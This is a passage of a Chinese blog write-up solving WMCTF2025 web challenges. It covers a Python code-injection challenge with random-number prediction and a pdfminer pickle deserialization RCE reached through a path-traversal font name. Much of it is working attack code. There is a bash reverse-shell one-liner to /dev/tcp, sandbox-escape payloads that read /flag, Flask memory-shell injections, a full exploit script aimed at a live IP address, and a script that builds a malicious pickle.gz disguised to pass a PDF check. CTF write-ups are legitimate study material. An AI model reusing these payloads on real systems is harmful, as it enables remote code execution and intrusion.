+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;subprocess&#x27;).Popen([&#x27;bash&#x27;,&#x27;-c&#x27;,&#x27;bash -i &gt;&amp; /dev/tcp/xxxx/6666 0&gt;&amp;1&#x27;])</span><br><span class="line">__import__(&#x27;os&#x27;).system(&quot;mkdir static&amp;&amp;cat /flag &gt; static/a.txt&quot;)</span><br></pre></td></tr></table></figure>
+<p>收集了一些大佬的payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">不出网利用：创建静态文件夹，再写入文件</span><br><span class="line"> &quot;payload&quot;: &quot;(lambda o: [o.mkdir(&#x27;static&#x27;), open(&#x27;static/out.txt&#x27;,&#x27;w&#x27;).write(o.popen(&#x27;tac /flag&#x27;).read())])(next(c.__init__.__globals__[&#x27;os&#x27;] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,&#x27;__globals__&#x27;) and &#x27;os&#x27; in c.__init__.__globals__))&quot;</span><br><span class="line"></span><br><span class="line">不出网利用：外带到static目录直接读取</span><br><span class="line">&quot;payload&quot;: &quot;[cls for cls in ().__class__.__base__.__subclasses__() if cls.__name__==&#x27;Popen&#x27;][0](&#x27;mkdir -p static &amp;&amp; cat /flag &gt; static/flag.txt&#x27;, shell=True)&quot;</span><br><span class="line"></span><br><span class="line">打before_request内存马</span><br><span class="line">__import__(&quot;sys&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read())</span><br><span class="line">__import__(&quot;sys&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())</span><br></pre></td></tr></table></figure>
+<p>完整EXP:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> randcrack <span class="keyword">import</span> RandCrack</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://49.232.42.74:30222&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = requests.Session()</span><br><span class="line">    username = <span class="string">&quot;testuser1&quot;</span></span><br><span class="line">    password = <span class="string">&quot;testuser1&quot;</span></span><br><span class="line"></span><br><span class="line">    register_data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    r = s.post(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/register&quot;</span>, json=register_data)</span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">201</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;注册失败: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    user_id = r.json()[<span class="string">&#x27;user_id&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;注册成功，user_id: <span class="subst">&#123;user_id&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    login_data = &#123;<span class="string">&quot;username&quot;</span>: username, <span class="string">&quot;password&quot;</span>: password&#125;</span><br><span class="line">    r = s.post(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/login&quot;</span>, json=login_data)</span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;登录失败: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;登录成功&quot;</span>)</span><br><span class="line"></span><br><span class="line">    random_numbers = [<span class="built_in">int</span>(user_id)]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">623</span>):</span><br><span class="line">        data = &#123;<span class="string">&quot;key&quot;</span>: <span class="string">&quot;0&quot;</span>&#125;</span><br><span class="line">        r = s.post(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/api&quot;</span>, json=data)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">403</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;收集随机数失败: <span class="subst">&#123;r.status_code&#125;</span> <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        key2 = r.json()[<span class="string">&#x27;message&#x27;</span>].split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        random_numbers.append(<span class="built_in">int</span>(key2))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;收集到第<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>个随机数: <span class="subst">&#123;key2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    rc = RandCrack()</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> random_numbers:</span><br><span class="line">        rc.submit(num)</span><br><span class="line">    next_rand = rc.predict_getrandbits(<span class="number">32</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;预测的下一个随机数: <span class="subst">&#123;next_rand&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&quot;next(c.__init__.__globals__[&#x27;os&#x27;] for c in ().__class__.__base__.__subclasses__() if hasattr(c.__init__,&#x27;__globals__&#x27;) and &#x27;os&#x27; in c.__init__.__globals__).popen(&#x27;mkdir -p static &amp;&amp; tac /flag &gt; static/out.txt&#x27;).read()&quot;</span></span><br><span class="line">    data = &#123;<span class="string">&quot;key&quot;</span>: <span class="built_in">str</span>(next_rand), <span class="string">&quot;payload&quot;</span>: payload&#125;</span><br><span class="line">    r = s.post(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/api&quot;</span>, json=data)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Payload执行成功&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Payload执行失败: <span class="subst">&#123;r.status_code&#125;</span> <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    r = s.get(<span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>/static/out.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Flag: <span class="subst">&#123;r.text&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;读取flag失败: <span class="subst">&#123;r.status_code&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="../images/image-20250922221308111.png" alt="image-20250922221308111" /></p>
+<p><img src="../images/image-20250922221324622.png" alt="image-20250922221324622" /></p>
+<h2 id="pdf2textpdfpickle没懂"><a class="markdownIt-Anchor" href="#pdf2textpdfpickle没懂"></a> pdf2text(PDF+pickle=没懂)</h2>
+<p><a target="_blank" rel="noopener" href="https://baozongwi.xyz/p/wmctf-2025/#pdf2text">WMCTF2025</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个 PDF-to-text 转换器能有什么危害呢？</span><br></pre></td></tr></table></figure>
+<p>hint:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在 pdfminer 包中搜索“pickle.loads”并尝试访问它</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://app.py">app.py</a>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, render_template</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfdocument <span class="keyword">import</span> PDFDocument</span><br><span class="line"><span class="keyword">import</span> os, io</span><br><span class="line"><span class="keyword">from</span> pdfutils <span class="keyword">import</span> pdf_to_text</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 2MB limit</span></span><br><span class="line"></span><br><span class="line">os.makedirs(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file part&#x27;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    filename = file.filename</span><br><span class="line">    <span class="keyword">if</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No selected file&#x27;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;directory traversal is not allowed&#x27;</span>, <span class="number">403</span> </span><br><span class="line"></span><br><span class="line">    pdf_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    pdf_content = file.stream.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># just if is a pdf</span></span><br><span class="line">        parser = PDFParser(io.BytesIO(pdf_content))</span><br><span class="line">        doc = PDFDocument(parser)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(pdf_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_content)</span><br><span class="line"></span><br><span class="line">    md_filename = os.path.splitext(filename)[<span class="number">0</span>] + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    txt_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], md_filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pdf_to_text(pdf_path, txt_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> send_file(txt_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://pdfutils.py">pdfutils.py</a>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pdfminer.high_level <span class="keyword">import</span> extract_pages</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LTTextContainer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pdf_to_text</span>(<span class="params">pdf_path, txt_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(txt_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> txt:</span><br><span class="line">        <span class="keyword">for</span> page_layout <span class="keyword">in</span> extract_pages(pdf_path):</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> page_layout:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(element, LTTextContainer):</span><br><span class="line">                    txt.write(element.get_text())</span><br><span class="line">                    txt.write(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<h3 id="找链子"><a class="markdownIt-Anchor" href="#找链子"></a> 找链子</h3>
+<p>这里没有什么明显的漏洞，唯一没见过的就是pdf_to_text函数的实现</p>
+<p>根据提示，我们跟进extract_pages()：<br />
+<img src="../images/image-20250923103555717.png" alt="image-20250923103555717" /></p>
+<p>跟进PDFResourceManager()</p>
+<p><img src="../images/image-20250923104237484.png" alt="image-20250923104237484" /></p>
+<p>这里是处理字体类型的函数</p>
+<p><a target="_blank" rel="noopener" href="http://xn--PDFfont-5t0l998m.py">来到PDFfont.py</a>:<br />
+<img src="../images/image-20250923104417800.png" alt="image-20250923104417800" /></p>
+<p>处理CID字体</p>
+<p><img src="../images/image-20250923104559756.png" alt="image-20250923104559756" /></p>
+<p>跟进self.get_cmap_from_spec</p>
+<p><img src="../images/image-20250923104638000.png" alt="image-20250923104638000" /></p>
+<p>跟进CMapDB.get_cmap()</p>
+<p><img src="../images/image-20250923104745699.png" alt="image-20250923104745699" /></p>
+<p>跟进<code>_load_data()</code></p>
+<p><img src="../images/image-20250923104849497.png" alt="image-20250923104849497" /></p>
+<p>找到pickle.loads，按hint来说应该可以触发rce漏洞</p>
+<p>本来应该倒着推出链子的，但我太菜了，只能跟着大佬一步步来</p>
+<p><strong>链子：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">用户上传PDF</span><br><span class="line">   ↓</span><br><span class="line"><span class="number">2.</span> app.py: upload_file() → pdf_to_text()</span><br><span class="line">   ↓</span><br><span class="line"><span class="number">3.</span> pdfutils.py: pdf_to_text() → extract_pages()</span><br><span class="line">   ↓</span><br><span class="line"><span class="number">4.</span> high_level.py: extract_pages() → PDFPageInterpreter.process_page()</span><br><span class="line">   ↓</span><br><span class="line"><span class="number">5.</span> pdfinterp.py: PDFResourceManager.get_font() → 字体类型判断</span><br><span class="line">   ↓</span><br><span class="line"><span class="number">6.</span> pdffont.py: PDFCIDFont.__init__() → 处理CID字体</span><br><span class="line">   ↓</span><br><span class="line"><span class="number">7.</span> pdffont.py: <span class="variable language_">self</span>.get_cmap_from_spec 调用 CMapDB.get_cmap(cmap_name)</span><br><span class="line">   ↓</span><br><span class="line"><span class="number">8.</span> cmapdb.py: CMapDB.get_cmap(cmap_name) → _load_data()</span><br><span class="line">   ↓</span><br><span class="line"><span class="number">9.</span> cmapdb.py: pickle.loads() - RCE漏洞触发</span><br></pre></td></tr></table></figure>
+<h3 id="题解-2"><a class="markdownIt-Anchor" href="#题解-2"></a> 题解</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@classmethod</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_load_data</span>(<span class="params">cls, name: <span class="built_in">str</span></span>) -&gt; <span class="type">Any</span>:</span><br><span class="line">    name = name.replace(<span class="string">&quot;\0&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    filename = <span class="string">&quot;%s.pickle.gz&quot;</span> % name</span><br><span class="line">    log.debug(<span class="string">&quot;loading: %r&quot;</span>, name)</span><br><span class="line">    cmap_paths = (</span><br><span class="line">        os.environ.get(<span class="string">&quot;CMAP_PATH&quot;</span>, <span class="string">&quot;/usr/share/pdfminer/&quot;</span>),</span><br><span class="line">        os.path.join(os.path.dirname(__file__), <span class="string">&quot;cmap&quot;</span>),</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">for</span> directory <span class="keyword">in</span> cmap_paths:</span><br><span class="line">        path = os.path.join(directory, filename)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(path):</span><br><span class="line">            gzfile = gzip.<span class="built_in">open</span>(path)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">type</span>(<span class="built_in">str</span>(name), (), pickle.loads(gzfile.read()))</span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                gzfile.close()</span><br><span class="line">    <span class="keyword">raise</span> CMapDB.CMapNotFound(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这个 <code>@classmethod</code> 的作用是根据给定的 <code>name</code> 去几个候选目录里查找一个名为 <code>name.pickle.gz</code> 的压缩 pickle 文件，解压并反序列化（<code>pickle.loads</code>），然后用反序列化得到的映射构造出一个<strong>动态类</strong>并返回。若找不到文件就抛出 <code>CMapDB.CMapNotFound(name)</code>。</p>
+<p><strong>思路:需要一个能被gzip.open().read()读出来而且能过pdf检测的.pickle.gz文件用于load,一个pdf用于触发pickle.loads()</strong></p>
+<p>生成可被pickle.loads()的文件</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> gzip</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (os.system, (<span class="string">&#x27;kcalc&#x27;</span>,))</span><br><span class="line">    </span><br><span class="line">payload = pickle.dumps(Exploit())</span><br><span class="line">gz_payload = gzip.compress(payload)</span><br><span class="line">pdf_header = <span class="string">b&quot;%PDF-1.1\n1 0 obj\n&lt;&lt; /Type /Catalog &gt;&gt;\nendobj\nxref\n0 2\n0000000000 65535 f \n0000000010 00000 n \ntrailer\n&lt;&lt; /Size 2 /Root 1 0 R &gt;&gt;\nstartxref\n38\n%%EOF\n&quot;</span></span><br><span class="line">gz_pdf = gzip.compress(pdf_header, compresslevel=<span class="number">0</span>)  <span class="comment"># 不压缩，直接存储原始数据</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.pickle.gz&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(gz_payload)  <span class="comment"># 第一个成员：pickle</span></span><br><span class="line">    f.write(gz_pdf)      <span class="comment"># 第二个成员：pdf_header原始内容</span></span><br></pre></td></tr></table></figure>
+<p>还有个问题就是，pdf里面的键名是用/开头的，如果后续字符串中有/会被截断，所以那个name里好像不能包含/，这个可以用编码解决，/用<code>#2F</code></p>
+<p>这里直接随便生成一个pdf，然后记事本搜动态调试时解析出的字符串，修改这个name</p>
+<p><img src="../images/640.webp" alt="图片" /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/BaseFont /xxx</span><br><span class="line"> 基础字体名叫xxx</span><br><span class="line"> </span><br><span class="line"> /Encoding /xxx</span><br><span class="line"> pdfminer 在解析时会把 /Encoding /xxxx 当作 CMap 名字，然后调用 _load_data(&quot;xxxx&quot;) 去找 xxxx.pickle.gz。</span><br><span class="line">如果这里的 “xxxx” 可以包含 ../，那就有可能让它到别的目录去加载任意文件。</span><br></pre></td></tr></table></figure>
+<p>可以看到能够成功实现目录穿越pickle.loads()到我们上传的恶意文件</p>
+<p><img src="../images/640-17585969686333.webp" alt="图片" /></p>
+<p>生成一个pdf name为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Fapp#2Fuploads#2Ftest</span><br></pre></td></tr></table></figure>
+<p>反弹shell然后cat /flag</p>
+<h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3>
+<p><a target="_blank" rel="noopener" href="https://baozongwi.xyz/p/wmctf-2025/#pdf2text">WMCTF2025</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.xmcve.com/2025/09/22/WMCTF2025-Writeup/#title-9">WMCTF2025 Writeup - 星盟安全团队</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIxNDU2ODg3Mw==&amp;mid=2247486339&amp;idx=1&amp;sn=e0d8b3819089248e3b3fa3e83e9502bd&amp;chksm=96f9682c2ce4f58a1f8dd6aa917784d095d13d8f7fe11b5d06d891e5d0cbe575e7577c8fec77&amp;mpshare=1&amp;scene=23&amp;srcid=0922iJ4zVooa3N2veIc8IzX6&amp;sharer_shareinfo=b0375612e3d8dbabe7e25f956703f23a&amp;sharer_shareinfo_first=b0375612e3d8dbabe7e25f956703f23a#rd">WMCTF2025 WriteUp</a></p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzE5ODQzMzkyOQ==&amp;mid=2247483730&amp;idx=1&amp;sn=ca849dec81813363536e855d4c2fa505&amp;chksm=97f7eb41ff1a7d071ec3d16422089681f04269efb3eb64ef39586f2f7bb40c8c13f9db3627a7&amp;mpshare=1&amp;scene=23&amp;srcid=0922arK2Oj7DxUv967FqMK9W&amp;sharer_shareinfo=6eb07204f6c4b36da23d909f3222f7a7&amp;sharer_shareinfo_first=6eb07204f6c4b36da23d909f3222f7a7#rd">WMCTF2025-Writeup by 0psu3</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/getrandbits%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%84%E6%B5%8B/" rel="tag">getrandbits伪随机数预测</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/" rel="tag">比赛复现</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/1755142834147175514283467.jpg" data-sizes="auto" alt="ACTF2025" class="lazyload">
+          
+        
+        <a href="/2025/09/23/ACTF2025/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            ACTF2025
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/1755142834147175514283467.jpg" data-sizes="auto" alt="2024年湖南省网络攻防赛道赛题复现" class="lazyload">
+        
+      
+      <a href="/2025/09/21/2024%E5%B9%B4%E6%B9%96%E5%8D%97%E7%9C%81%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%B5%9B%E9%81%93%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          2024年湖南省网络攻防赛道赛题复现
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
